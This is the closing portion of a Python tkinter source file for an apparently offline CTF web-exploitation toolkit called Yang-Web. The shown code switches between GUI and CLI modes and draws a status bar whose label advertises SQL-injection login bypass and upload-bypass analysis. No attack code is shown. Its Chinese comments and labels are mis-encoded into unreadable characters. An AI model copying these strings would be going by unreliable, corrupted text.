        _append(cli_output, "â" * 60)
        _append(cli_output, "  Yang-Web CLI  â  åµå¥å¼ç»ç«¯")
        _append(cli_output, f"  41 èæ¬  Â·  15 æ¨¡å  Â·  ç¦»çº¿è¿è¡")
        _append(cli_output, "â" * 60)
        _append(cli_output, "  Type 'help' for commands, 'exit' to return to GUI")
        _append(cli_output, "")

    # ââ æ¨¡å¼åæ¢é»è¾ ââ
    def _toggle_mode():
        if mode["current"] == "gui":
            # åæ¢å° CLI
            gui_frame.pack_forget()
            cli_frame.pack(fill=tk.BOTH, expand=True)
            mode["current"] = "cli"
            toggle_btn.configure(text="ð¥ GUI", fg=YELLOW)
            mode_label.configure(text="å½ä»¤è¡æ¨¡å¼  Â·  Type 'help'  Â·  'exit' è¿å GUI")

            # æ¬¢è¿ä¿¡æ¯
            _clear_output(cli_output)
            _show_cli_welcome()
            cli_entry.focus_set()
        else:
            # åæ¢å GUI
            cli_frame.pack_forget()
            gui_frame.pack(fill=tk.BOTH, expand=True)
            mode["current"] = "gui"
            toggle_btn.configure(text="ð» CLI", fg=ACCENT)
            mode_label.configure(text="ç¦»çº¿ CTF Web çå£«åå  Â·  15 ä¸ªæ¨¡å + 41 ååµèæ¬")

    toggle_btn.configure(command=_toggle_mode)

    # åå§æ¾ç¤º GUI
    gui_frame.pack(fill=tk.BOTH, expand=True)

    # ââ åºé¨ç¶ææ  ââ
    status = tk.Frame(root, bg=DARK, height=28)
    status.pack(fill=tk.X, side=tk.BOTTOM)
    status.pack_propagate(False)
    tk.Label(status, text="Yang-Web v1.4.0  |  GUI+CLI åæ¨¡å¼  |  ä¸ä¼ é¶åºåæ + SQLiè®¤è¯ç»è¿  |  ð» åæ¢",
             bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)

    root.mainloop()


if __name__ == "__main__":
    run_gui()
